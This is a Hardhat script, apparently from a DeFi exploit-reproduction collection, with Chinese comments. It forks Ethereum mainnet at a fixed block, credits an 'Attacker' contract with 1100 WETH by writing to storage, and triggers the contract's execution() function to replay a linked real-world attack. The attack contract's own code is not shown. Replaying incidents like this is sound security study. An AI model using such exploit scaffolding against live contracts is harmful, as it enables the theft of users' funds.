const {network, ethers} = require("hardhat");
const hre = require("hardhat");


async function main() {
  // fork the mainnet, blockheight: 17807829
  // 链上攻击案例：
  // https://explorer.phalcon.xyz/tx/eth/0x2e7dc8b2fb7e25fd00ed9565dcc0ad4546363171d5e00f196d48103983ae477c
  //
  await hre.network.provider.request({
      method: "hardhat_reset",
      params: [{
          forking: {
              jsonRpcUrl:"https://rpc.ankr.com/eth",
              blockNumber: 17807829
          }
      }]
  })

  // import vars
  const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
  const [user] = await ethers.getSigners();
  const amount = 1100000000000000000000; //1100 ETH

  // deplay the attack contract
  const attacker = await ethers.deployContract("Attacker");
  const attackerContract = await attacker.getAddress();
  console.log("attacker contract:", attackerContract);

  // 一些有用的函数
  const toBytes32 = (bn) => {
      return ethers.hexlify(ethers.zeroPadValue(ethers.toBeHex(BigInt(bn)), 32));
  };
  const setStorageAt = async (address, index, value) => {
      await ethers.provider.send("hardhat_setStorageAt", [address, index, value]);
  }
  
  // 下面的修改涉及到EVM的存储，请参考EVM存储
  // 为attacker地址配置1100 WETH
  //
  const attackerIndex = ethers.solidityPackedKeccak256(["uint256", "uint256"], [attackerContract, 3]);
  await setStorageAt(WETH, attackerIndex, toBytes32(amount).toString());
  //
  // 执行
  //
  const wethToken = await ethers.getContractAt("IERC20", WETH);
  const attackerBalanceBefore = await wethToken.balanceOf(attackerContract);
  console.log("WETH Balance of Attacker (Before) = ", BigInt(attackerBalanceBefore).toString());
  //
  const executionFunctionName = "execution";
  const AttackerInterface = new ethers.Interface([
      "function execution() public"
  ]);
  const executionParams = []
  await user.sendTransaction({
      to: attackerContract,
      data: AttackerInterface.encodeFunctionData(executionFunctionName, executionParams)
  });
  //
  const attackerBalanceAfter = await ethers.provider.getBalance(attackerContract);
  console.log("ETH Balance of Attacker (After) = ", BigInt(attackerBalanceAfter).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
